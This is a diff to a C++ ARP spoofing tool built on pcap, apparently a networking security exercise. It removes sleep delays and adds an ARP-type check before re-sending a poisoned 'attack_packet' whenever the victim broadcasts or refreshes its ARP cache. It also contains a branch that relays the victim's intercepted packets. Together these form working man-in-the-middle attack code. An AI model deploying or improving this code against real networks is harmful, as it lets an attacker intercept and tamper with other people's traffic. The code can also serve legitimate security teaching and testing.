@@ -22,7 +22,6 @@ void arp_spoofing::SetTarget(const u_char* ip){
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) return;
-        sleep(1);
 
         if (arpcd::IsReplyPacket(packet,
                                  ip,
@@ -63,7 +62,6 @@ void arp_spoofing::SetSender(const u_char* ip){
             print(Sender->GetMacAddress(), MAC_SIZE);
             break;
         }
-        sleep(1);
     }
 
     delete REQ_PACKET;
@@ -103,11 +101,12 @@ void arp_spoofing::ExecuteArpSpoofing() {
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) return;
-
-        if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress()) ||
-                arpcd::IsCacheUpdate(packet, Target->GetIpAddress(), Sender->GetMacAddress())){
-            pcap_sendpacket(handle, attack_packet, 58);
-        }
+		if (arpcd::IsArp(&packet[12])){
+        	if(arpcd::IsBroadcastArp(packet, Sender->GetMacAddress()) ||
+            	    arpcd::IsCacheUpdate(packet, Target->GetIpAddress(), Sender->GetMacAddress())){
+           		pcap_sendpacket(handle, attack_packet, 58);
+        	}
+		}
         else if (pcktcd::IsSenderPacket(packet, Sender->GetMacAddress(), Attacker->GetMacAddress())){
             int packet_size = (int)header->len;
             u_char* relay_packet = new u_char[packet_size];
